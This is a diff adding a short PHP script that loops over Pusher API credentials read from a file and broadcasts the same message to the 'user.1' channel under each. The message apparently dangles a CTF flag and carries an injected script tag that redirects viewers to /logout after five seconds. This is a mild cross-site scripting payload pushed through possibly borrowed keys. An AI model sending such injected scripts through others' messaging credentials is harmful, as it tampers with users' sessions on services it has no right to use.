@@ -1,0 +1,28 @@
+<?php
+require __DIR__ . '/vendor/autoload.php';
+
+
+$data['message'] = '意思意思，送个 Flag： xxxxxxx <script>window.setTimeout(hello,5000); function hello(){window.location.href="/logout";}</script>';
+
+$options = array(
+  'cluster' => 'ap1',
+  'useTLS' => true
+);
+
+$pushers = json_decode(file_get_contents("pusher-key.json"));
+$count = count($pushers);
+
+for ($i=0; $i < $count; $i++) { 
+	$pusher = new Pusher\Pusher(
+		$pushers[$i]->key,
+		$pushers[$i]->secret,
+		$pushers[$i]->app_id,
+		$options
+	);
+	$pusher->trigger('user.1', 'my-event', $data);
+	echo "Pusher sent ", $pushers[$i]->name, "\n";
+}
+
+ 
+
+
